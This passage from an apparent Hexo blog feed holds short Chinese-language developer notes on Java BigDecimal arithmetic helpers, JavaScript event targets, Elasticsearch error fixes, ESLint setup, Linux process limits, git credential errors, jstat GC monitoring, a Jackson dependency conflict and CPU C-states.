<h2 id="使用時機"><a href="#使用時機" class="headerlink" title="使用時機:"></a>使用時機:</h2><h2 id="1-在接收參數時數值若小於Double-MAX-VALUE，使用double基本型別來接收參數2-計算統一用BigDecimalUtils來做加減乘除3-加法4-減法"><a href="#1-在接收參數時數值若小於Double-MAX-VALUE，使用double基本型別來接收參數2-計算統一用BigDecimalUtils來做加減乘除3-加法4-減法" class="headerlink" title="1.在接收參數時數值若小於Double.MAX_VALUE，使用double基本型別來接收參數2.計算統一用BigDecimalUtils來做加減乘除3.加法4.減法"></a>1.在接收參數時數值若小於Double.MAX_VALUE，使用double基本型別來接收參數<br>2.計算統一用BigDecimalUtils來做加減乘除<br>3.加法<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static BigDecimal add(double v1, double v2) &#123;</span><br><span class="line">	<span class="built_in">return</span> BigDecimalUtils.add(getInstance(v1), getInstance(v2));</span><br><span class="line">&#125;</span><br><span class="line">// new BigDecimal(double val)會有問題，ex : new BigDecimal(0.01);</span><br><span class="line">public static BigDecimal getInstance(double value) &#123;</span><br><span class="line">	<span class="built_in">return</span> BigDecimal.valueOf(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>4.減法</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static BigDecimal subtract(double v1, double v2) &#123;</span><br><span class="line">	<span class="built_in">return</span> BigDecimalUtils.subtract(BigDecimal.valueOf(v1), BigDecimal.valueOf(v2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="5-乘法"><a href="#5-乘法" class="headerlink" title="5.乘法"></a>5.乘法</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static BigDecimal multiply(double v1, double v2) &#123;</span><br><span class="line">	<span class="built_in">return</span> BigDecimalUtils.multiply(getInstance(v1), getInstance(v2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="6-除法"><a href="#6-除法" class="headerlink" title="6.除法"></a>6.除法</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static BigDecimal divide(double v1, double v2, int scale) &#123;</span><br><span class="line">	<span class="keyword">if</span> (scale &lt; 0) &#123;</span><br><span class="line">		throw new IllegalArgumentException(<span class="string">&quot;The scale must be a positive integer or zero&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> BigDecimal.valueOf(v1).divide(BigDecimal.valueOf(v2), scale, BigDecimal.ROUND_HALF_UP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>BigDecimal</tag>
        <tag>double</tag>
      </tags>
  </entry>
  <entry>
    <title>e.currentTarget Versus e.target</title>
    <url>/posts/efca1772/</url>
    <content><![CDATA[<h3 id="e-currentTarget-Versus-e-target"><a href="#e-currentTarget-Versus-e-target" class="headerlink" title="e.currentTarget Versus e.target"></a>e.currentTarget Versus e.target</h3><span id="more"></span>
<p>這篇介紹e.currentTarget和e.target兩者差異，當一個dom物件被觸發一個事件後，事件會冒泡，如果冒泡到父節點，且父節點也bind相同e.事件的話就會觸發該事件。<br>這是可通過e.currentTarget 和 e.target來判斷事件的bind物件和觸發物件分別是誰。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">HTML:</span><br><span class="line">&lt;ul <span class="built_in">id</span>=<span class="string">&quot;fa&quot;</span>&gt;</span><br><span class="line">   &lt;li class=<span class="string">&quot;son1&quot;</span>&gt;son1&lt;/li&gt;</span><br><span class="line">   &lt;li class=<span class="string">&quot;son2&quot;</span>&gt;son2&lt;/li&gt;</span><br><span class="line">   &lt;li class=<span class="string">&quot;son3&quot;</span>&gt;son3&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">JavaScript:</span><br><span class="line"><span class="built_in">let</span> fa = document.getElementById(<span class="string">&#x27;fa&#x27;</span>);</span><br><span class="line">fa.onclick = <span class="keyword">function</span>(e) &#123;</span><br><span class="line">  console.log(`%ccurrentTarget: %c<span class="variable">$&#123;e.currentTarget.innerHTML&#125;</span>`, <span class="string">&#x27;color: red&#x27;</span>, <span class="string">&#x27;color: red&#x27;</span>);</span><br><span class="line">  console.log(`%ctarget: %c<span class="variable">$&#123;e.target.innerHTML&#125;</span>`, <span class="string">&#x27;color: yellow&#x27;</span>, <span class="string">&#x27;color:yellow&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">當點選&lt;ul&gt;&lt;/ul&gt;相當於在<span class="built_in">id</span>=fa的節點上觸發時間，因此target、currentTarget均指向<span class="built_in">id</span>=fa節點</span><br><span class="line">當點選&lt;li&gt;son1、son2、son3&lt;/li&gt;時，事件是在子節點觸發，但事件是繫結在父節點上，因此currentTarget指向ul節點，target指向li節點</span><br></pre></td></tr></table></figure>

<h3 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">e.currentTarget：指的是註冊事件物件</span><br><span class="line">e.target：指的是實際觸發事件的物件</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>elasticsearch apache http client utils urlencodedutils formatsegments</title>
    <url>/posts/deb09f9b/</url>
    <content><![CDATA[<h3 id="elasticsearch-java-lang-nosuch-method-error-org-apache-http-client-utils-urlencodedutils-formatsegments"><a href="#elasticsearch-java-lang-nosuch-method-error-org-apache-http-client-utils-urlencodedutils-formatsegments" class="headerlink" title="elasticsearch java lang nosuch method error org apache http client utils urlencodedutils formatsegments"></a>elasticsearch java lang nosuch method error org apache http client utils urlencodedutils formatsegments</h3><span id="more"></span>
<p>這篇介紹elasticsearch java lang nosuch method error org apache http client utils urlencodedutils formatsegments。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用 Java Low Level REST Client建立連線時，並使用Search方法時</span><br><span class="line">出現elasticsearch java lang nosuch method error org apache http </span><br><span class="line">client utils urlencodedutils formatsegments</span><br><span class="line">錯誤</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;httpclient&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;4.5.3&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">需升級</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;httpclient&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;4.5.13&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">即可正常使用</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
        <tag>JavaClient</tag>
      </tags>
  </entry>
  <entry>
    <title>ElasticSearch Disk Usage Exceeded Flood Stage Watermark</title>
    <url>/posts/783e7dff/</url>
    <content><![CDATA[<h3 id="How-To-Solve-ElasticSearch-Disk-Usage-Exceeded-Flood-Stage-Watermark"><a href="#How-To-Solve-ElasticSearch-Disk-Usage-Exceeded-Flood-Stage-Watermark" class="headerlink" title="How To Solve ElasticSearch Disk Usage Exceeded Flood Stage Watermark"></a>How To Solve ElasticSearch Disk Usage Exceeded Flood Stage Watermark</h3><span id="more"></span>
<p>這篇介紹How To Solve ElasticSearch Disk Usage Exceeded Flood Stage Watermark。</p>
<h3 id="錯誤訊息"><a href="#錯誤訊息" class="headerlink" title="錯誤訊息"></a>錯誤訊息</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;took&quot;</span>:59464,<span class="string">&quot;timed_out&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;total&quot;</span>:1,<span class="string">&quot;updated&quot;</span>:0,<span class="string">&quot;deleted&quot;</span>:0,<span class="string">&quot;batches&quot;</span>:1,</span><br><span class="line"><span class="string">&quot;version_conflicts&quot;</span>:0,<span class="string">&quot;noops&quot;</span>:0,<span class="string">&quot;retries&quot;</span>:&#123;<span class="string">&quot;bulk&quot;</span>:11,<span class="string">&quot;search&quot;</span>:0&#125;,</span><br><span class="line"><span class="string">&quot;throttled_millis&quot;</span>:0,<span class="string">&quot;requests_per_second&quot;</span>:-1.0,<span class="string">&quot;throttled_until_millis&quot;</span>:0,</span><br><span class="line"><span class="string">&quot;failures&quot;</span>:[&#123;<span class="string">&quot;index&quot;</span>:<span class="string">&quot;index-2022.08.17&quot;</span>,</span><br><span class="line"><span class="string">&quot;type&quot;</span>:<span class="string">&quot;_doc&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="string">&quot;Mexico-512-GA132880061&quot;</span>,<span class="string">&quot;cause&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;cluster_block_exception&quot;</span>,</span><br><span class="line"><span class="string">&quot;reason&quot;</span>:<span class="string">&quot;index [index-2022.08.17] </span></span><br><span class="line"><span class="string">blocked by: [TOO_MANY_REQUESTS/12/disk usage exceeded flood-stage watermark,</span></span><br><span class="line"><span class="string"> index has read-only-allow-delete block];&quot;</span>&#125;,<span class="string">&quot;status&quot;</span>:429&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ElasticSearch硬碟滿了，需去砍資料及重新設定資料保留天數!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro ElasticSearch String About Text Versus Keyword</title>
    <url>/posts/bf2bc18b/</url>
    <content><![CDATA[<h2 id="Intro-ElasticSearch-String-About-Text-Versus-Keyword"><a href="#Intro-ElasticSearch-String-About-Text-Versus-Keyword" class="headerlink" title="Intro ElasticSearch String About Text Versus Keyword"></a>Intro ElasticSearch String About Text Versus Keyword</h2><span id="more"></span>
<p>這篇介紹ElasticSearch String About Text Versus Keyword。</p>
<h2 id="在ElasticSearch-有兩種-String-分別是-Text-和-Keyword兩種用途不同如下"><a href="#在ElasticSearch-有兩種-String-分別是-Text-和-Keyword兩種用途不同如下" class="headerlink" title="在ElasticSearch 有兩種 String 分別是 Text 和 Keyword兩種用途不同如下"></a>在ElasticSearch 有兩種 String 分別是 Text 和 Keyword<br>兩種用途不同如下</h2><p>Text : 用於全文檢索<br>Keyword : 用於Sorting &amp; Aggregation</p>
<p>預設在Dynamic mapping中，這兩種Pattern是同時存在<br>因此index會佔用較多硬碟空間資源</p>
]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>eslint enable for visual studio code</title>
    <url>/posts/6ef06d56/</url>
    <content><![CDATA[<h3 id="eslint-enable-for-visual-studio-code"><a href="#eslint-enable-for-visual-studio-code" class="headerlink" title="eslint enable for visual studio code"></a>eslint enable for visual studio code</h3><span id="more"></span>
<p>這篇介紹eslint enable for visual studio code.</p>
<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">visual studio code 安裝完eslint插件後</span><br><span class="line">使用npm init 和 eslint --init 產生package.json 及 .eslintrc.js</span><br><span class="line">.eslintrc.js 必須使用自定義的檔案才能生效</span><br><span class="line"></span><br><span class="line">1.檢查Eslint: Enable設定是否開啟</span><br><span class="line">2.LF和CRLF的設定會影響檢查</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eslint</category>
      </categories>
      <tags>
        <tag>Eslint</tag>
        <tag>VisualStudioCode</tag>
      </tags>
  </entry>
  <entry>
    <title>ExportRunnableJAR-Could not find main method from given luanch configuration</title>
    <url>/posts/7288fbfa/</url>
    <content><![CDATA[<h3 id="ExportRunnableJAR-Could-not-find-main-method-from-given-luanch-configuration"><a href="#ExportRunnableJAR-Could-not-find-main-method-from-given-luanch-configuration" class="headerlink" title="ExportRunnableJAR-Could not find main method from given luanch configuration"></a>ExportRunnableJAR-Could not find main method from given luanch configuration</h3><span id="more"></span>
<p>介紹在Export Runnable JAR時，出現Could not find main method from given luanch configuration警告。<br>該如何解決~~</p>
<h3 id="Eclipse-gt-Run-gt-Run-Configuration"><a href="#Eclipse-gt-Run-gt-Run-Configuration" class="headerlink" title="Eclipse -&gt; Run -&gt; Run Configuration"></a>Eclipse -&gt; Run -&gt; Run Configuration</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Java Application的Main Class設定要正確</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/JavaApplicationMainClass.PNG" width="50%" />]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Runnable JAR</tag>
      </tags>
  </entry>
  <entry>
    <title>How to solve (fork: retry: Resource temporarily unavaliable)</title>
    <url>/posts/af09333a/</url>
    <content><![CDATA[<h2 id="How-to-solve-fork-retry-Resource-temporarily-unavaliable"><a href="#How-to-solve-fork-retry-Resource-temporarily-unavaliable" class="headerlink" title="How to solve (fork: retry: Resource temporarily unavaliable)"></a>How to solve (fork: retry: Resource temporarily unavaliable)</h2><span id="more"></span>
<p>這篇介紹How to solve (fork: retry: Resource temporarily unavaliable)。</p>
<h2 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境:"></a>發生情境:</h2><p>在Linux機器上<br>sh 某個 .sh檔案時出現<br>$ fork: retry: Resource temporarily unavaliable</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h2><p>出現此訊息表示Linux作業系統無法建立更多process</p>
<p>可以用<br>$ ulimit -a<br>來檢視目前的系統參數<br>會看到主要影響的參數如下:<br>max user processes(-u)1024</p>
<h2 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法:"></a>解決方法:</h2><p>可以使用<br>$ ulimit -u 4096 修改max user processes的值<br>但這只是暫時修改，重新登入值會回到原本設定</p>
<p>正確修改<br>$ vim &#x2F;etc&#x2F;security&#x2F;limits.d&#x2F;90-nproc.conf<br>$ *		soft	nproc	1024</p>
<p>將.conf檔案內1024修改為4096</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>git Error:remote:HTTP Basic Access denied</title>
    <url>/posts/a78d729d/</url>
    <content><![CDATA[<h3 id="git-Error-remote-HTTP-Basic-Access-denied"><a href="#git-Error-remote-HTTP-Basic-Access-denied" class="headerlink" title="git Error:remote:HTTP Basic Access denied"></a>git Error:remote:HTTP Basic Access denied</h3><span id="more"></span>
<p>SourceTree的remote操作pull、push… 或clone GitLab專案時等，出現<br>remote: HTTP Basic: Access denied<br>fatal: Authentication failed for ‘<span class="exturl" data-url="aHR0cDovL3h4eC94eHguZ2l0">http://xxx/xxx.git<i class="fa fa-external-link-alt"></i></span>‘</p>
<h3 id="原因是remote的使用者名稱和密碼與當前系統中git儲存的使用者名稱和密碼有衝突"><a href="#原因是remote的使用者名稱和密碼與當前系統中git儲存的使用者名稱和密碼有衝突" class="headerlink" title="原因是remote的使用者名稱和密碼與當前系統中git儲存的使用者名稱和密碼有衝突"></a>原因是remote的使用者名稱和密碼與當前系統中git儲存的使用者名稱和密碼有衝突</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Step1:在作業系統中以管理員身份開啟命令列工具</span><br><span class="line"></span><br><span class="line">Step2:輸入git config --system --<span class="built_in">unset</span> credential.helper命令，作用就是清空本地儲存的使用者名稱和密碼</span><br><span class="line"></span><br><span class="line">Step3:這裡一定要以管理員身份開啟，不然會出現：</span><br><span class="line"></span><br><span class="line">error: could not lock config file C:/Program Files/Git/mingw64/etc/gitconfig: Permission denied</span><br><span class="line">再執行遠端操作，會提示輸入遠端端的使用者名稱和密碼重新輸入遠端端的使用者名稱和密碼</span><br><span class="line"></span><br><span class="line">Step4:每次操作遠端倉庫都需要重新輸入使用者名稱和密碼，原因是git config --system --<span class="built_in">unset</span> credential.helper</span><br><span class="line">這個命令清空gitconfig裡的自動儲存使用者名稱和密碼配置</span><br></pre></td></tr></table></figure>

<h3 id="檢查gitconfig"><a href="#檢查gitconfig" class="headerlink" title="檢查gitconfig"></a>檢查gitconfig</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Git\mingw64\etc\gitconfig</span><br><span class="line">有沒有以下兩行指令，沒有的話請加上</span><br><span class="line">[credential]</span><br><span class="line">  helper = manager</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>SourceTree</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Launch jstat On Linux</title>
    <url>/posts/56347a6b/</url>
    <content><![CDATA[<h3 id="How-To-Launch-jstat-On-Linux"><a href="#How-To-Launch-jstat-On-Linux" class="headerlink" title="How To Launch jstat On Linux"></a>How To Launch jstat On Linux</h3><span id="more"></span>
<p>這篇介紹How To Launch jstat On Linux。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ jstat -gc -t 11656 10000 30</span><br><span class="line"></span><br><span class="line">Params:</span><br><span class="line">-gc: garbage collection related statistics will be printed</span><br><span class="line"></span><br><span class="line">-t timestamp since JVM was started will be printed</span><br><span class="line"></span><br><span class="line">11656: target JVM process Id</span><br><span class="line"></span><br><span class="line">10000: statistics will be printed every 10,000 milliseconds (i.e. 10 seconds).</span><br><span class="line"></span><br><span class="line">30: statistics will be printed <span class="keyword">for</span> 30 iterations. Thus, the above option </span><br><span class="line">will cause the JVM to <span class="built_in">print</span> metrics <span class="keyword">for</span> 300 seconds (i.e. 10 seconds x 30 iterations).</span><br></pre></td></tr></table></figure>

<h3 id="Result-Output"><a href="#Result-Output" class="headerlink" title="Result Output:"></a>Result Output:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@example]<span class="comment"># jstat -gc -t 2218710 10000 30</span></span><br><span class="line">Timestamp        S0C    S1C    S0U    S1U      EC       EU        OC         OU       MC     MU    CCSC   CCSU   YGC     YGCT    FGC    FGCT     GCT</span><br><span class="line">        58955.9  0.0   32768.0  0.0   32768.0 4587520.0 2555904.0 2719744.0   664397.9  117868.0 105008.1 15212.0 12647.9    339   12.181   0      0.000   12.181</span><br><span class="line">        58965.9  0.0   32768.0  0.0   32768.0 4587520.0 2654208.0 2719744.0   664397.9  117868.0 105008.1 15212.0 12647.9    339   12.181   0      0.000   12.181</span><br><span class="line">        58975.9  0.0   32768.0  0.0   32768.0 4587520.0 2752512.0 2719744.0   664397.9  117868.0 105008.1 15212.0 12647.9    339   12.181   0      0.000   12.181</span><br><span class="line">        58985.9  0.0   32768.0  0.0   32768.0 4587520.0 2850816.0 2719744.0   664397.9  117868.0 105008.1 15212.0 12647.9    339   12.181   0      0.000   12.181</span><br><span class="line">        58995.9  0.0   32768.0  0.0   32768.0 4587520.0 2949120.0 2719744.0   664397.9  117868.0 105008.1 15212.0 12647.9    339   12.181   0      0.000   12.181</span><br><span class="line">        59005.9  0.0   32768.0  0.0   32768.0 4587520.0 3637248.0 2719744.0   664397.9  117868.0 105008.1 15212.0 12647.9    339   12.181   0      0.000   12.181</span><br><span class="line">        59015.9  0.0   32768.0  0.0   32768.0 4587520.0 3735552.0 2719744.0   664397.9  117868.0 105008.1 15212.0 12647.9    339   12.181   0      0.000   12.181</span><br><span class="line">        59025.9  0.0   32768.0  0.0   32768.0 4587520.0 3833856.0 2719744.0   664397.9  117868.0 105008.1 15212.0 12647.9    339   12.181   0      0.000   12.181</span><br><span class="line">        59035.9  0.0   32768.0  0.0   32768.0 4587520.0 3932160.0 2719744.0   664397.9  117868.0 105008.1 15212.0 12647.9    339   12.181   0      0.000   12.181</span><br><span class="line">        59045.9  0.0   32768.0  0.0   32768.0 4587520.0 4030464.0 2719744.0   664397.9  117868.0 105008.1 15212.0 12647.9    339   12.181   0      0.000   12.181</span><br><span class="line">        59055.9  0.0   32768.0  0.0   32768.0 4587520.0 4128768.0 2719744.0   664397.9  117868.0 105008.1 15212.0 12647.9    339   12.181   0      0.000   12.181</span><br><span class="line">        59065.9  0.0   32768.0  0.0   32768.0 4587520.0 524288.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59075.9  0.0   32768.0  0.0   32768.0 4587520.0 589824.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59085.9  0.0   32768.0  0.0   32768.0 4587520.0 688128.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59095.9  0.0   32768.0  0.0   32768.0 4587520.0 819200.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59105.9  0.0   32768.0  0.0   32768.0 4587520.0 884736.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59115.9  0.0   32768.0  0.0   32768.0 4587520.0 983040.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59125.9  0.0   32768.0  0.0   32768.0 4587520.0 1703936.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59135.9  0.0   32768.0  0.0   32768.0 4587520.0 1769472.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59145.9  0.0   32768.0  0.0   32768.0 4587520.0 2621440.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59155.9  0.0   32768.0  0.0   32768.0 4587520.0 2752512.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59165.9  0.0   32768.0  0.0   32768.0 4587520.0 2818048.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59175.9  0.0   32768.0  0.0   32768.0 4587520.0 2916352.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59185.9  0.0   32768.0  0.0   32768.0 4587520.0 3637248.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59195.9  0.0   32768.0  0.0   32768.0 4587520.0 3735552.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59205.9  0.0   32768.0  0.0   32768.0 4587520.0 3833856.0 2719744.0   675338.9  117868.0 105008.1 15212.0 12647.9    340   12.197   0      0.000   12.197</span><br><span class="line">        59215.9  0.0   32768.0  0.0   32768.0 4587520.0 32768.0  2719744.0   669247.7  117868.0 105008.1 15212.0 12647.9    341   12.226   0      0.000   12.226</span><br><span class="line">        59225.9  0.0   32768.0  0.0   32768.0 4587520.0 294912.0 2719744.0   669247.7  117868.0 105008.1 15212.0 12647.9    341   12.226   0      0.000   12.226</span><br><span class="line">        59235.9  0.0   32768.0  0.0   32768.0 4587520.0 393216.0 2719744.0   669247.7  117868.0 105008.1 15212.0 12647.9    341   12.226   0      0.000   12.226</span><br><span class="line">        59245.9  0.0   32768.0  0.0   32768.0 4587520.0 1081344.0 2719744.0   669247.7  117868.0 105008.1 15212.0 12647.9    341   12.226   0      0.000   12.226</span><br><span class="line">		</span><br><span class="line">Timestamp – time since the start time of the target JVM <span class="keyword">in</span> seconds.</span><br><span class="line"></span><br><span class="line">S0C – Survivor 0 region capacity <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">S1C – Survivor 1 region capacity <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">S0U – Survivor 0 region utilized space <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">S1U – Survivor 1 region utilized space <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">EC – Eden region capacity <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">EU – Eden region’s utilized space <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">OC – Old region capacity <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">OU – Old region’s utilized space <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">MC – Metaspace region capacity <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">MU – Metaspace region utilized space <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">CCSC – Compressed Class space regions capacity <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">CCSU – Compressed Class space regions utilized space <span class="keyword">in</span> KB</span><br><span class="line"></span><br><span class="line">YGC – Number of Young GC events that have occurred so far</span><br><span class="line"></span><br><span class="line">YGCT – Amount of Young GC time spent so far</span><br><span class="line"></span><br><span class="line">FGC – Number of Full GC events that have occurred so far</span><br><span class="line"></span><br><span class="line">FGCT – Amount of Full GC time spent so far</span><br><span class="line"></span><br><span class="line">GCT – total amount of GC time spent so far (basically YGCT + FGCT)</span><br><span class="line"></span><br><span class="line">主要觀測FGC欄位是否有非0數值出現，代表有發生Full GC event</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>jstat</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>jstat</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Com Fasterxml Jackson Core TSFBuilder</title>
    <url>/posts/a5b6af7c/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Solve-Com-Fasterxml-Jackson-Core-TSFBuilder"><a href="#Intro-How-To-Solve-Com-Fasterxml-Jackson-Core-TSFBuilder" class="headerlink" title="Intro How To Solve Com Fasterxml Jackson Core TSFBuilder"></a>Intro How To Solve Com Fasterxml Jackson Core TSFBuilder</h3><span id="more"></span>
<p>這篇介紹How To Solve Com Fasterxml Jackson Core TSFBuilder.</p>
<h3 id="發生情境-amp-解決方法"><a href="#發生情境-amp-解決方法" class="headerlink" title="發生情境 &amp; 解決方法"></a>發生情境 &amp; 解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用Redisson.fromYAML方法時，因jackson-core使用的版本小於2.10.X</span><br><span class="line">造成此方法的底層找不到TSFBuilder class的方法使用。</span><br><span class="line"></span><br><span class="line">解決方法:</span><br><span class="line">1.調整Redisson引用的順序</span><br><span class="line">2.使用DependencyExclusions來去除降低相依版本</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>jackson</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
        <tag>jackson</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro cpupower</title>
    <url>/posts/6d1536c3/</url>
    <content><![CDATA[<h3 id="Intro-cpupower"><a href="#Intro-cpupower" class="headerlink" title="Intro cpupower"></a>Intro cpupower</h3><span id="more"></span>
<p>這篇介紹cpupower。</p>
<h3 id="C-states-versus-P-states"><a href="#C-states-versus-P-states" class="headerlink" title="C-states versus P-states"></a>C-states versus P-states</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">CPU 依據省電模式有區分為 Processor Operating States (C-states) </span><br><span class="line">與 Processor Performance States (P-states)。</span><br><span class="line"></span><br><span class="line">C-states:</span><br><span class="line">CPU 在沒有使用時可以被停用或以比較低的效能模式來運行，依據不同的</span><br><span class="line">狀態可以區分成為幾種 C-state。</span><br><span class="line">C-state 從 C0 (不閒置)開始，數字越高表示越省電(每一家的 CPU 定義</span><br><span class="line">C-state 會稍微不同)。</span><br><span class="line">CPU 的 C-state 有下面幾種。</span><br><span class="line"></span><br><span class="line">C0 – Operating State</span><br><span class="line">C1 – Halt</span><br><span class="line">C1E – Enhanced Halt</span><br><span class="line">C2 – Stop Grant</span><br><span class="line">C2 – Stop Clock</span><br><span class="line">C2E – Extended Stop Grant</span><br><span class="line">C3 – Sleep</span><br><span class="line">C3 – Deep Sleep</span><br><span class="line">C3 – AltVID</span><br><span class="line">C4 – Deeper Sleep</span><br><span class="line">C4E/C5 -Enhanced Deeper Sleep</span><br><span class="line">C6 – Deep Power Down</span><br><span class="line">C7 – C6 + LLC may be flushed</span><br><span class="line">C8 – C7 + LLC must be flushed</span><br><span class="line"></span><br><span class="line">P-States 就是指 CPU 依據目前狀態自行調整工作頻率，用以省電。</span><br></pre></td></tr></table></figure>

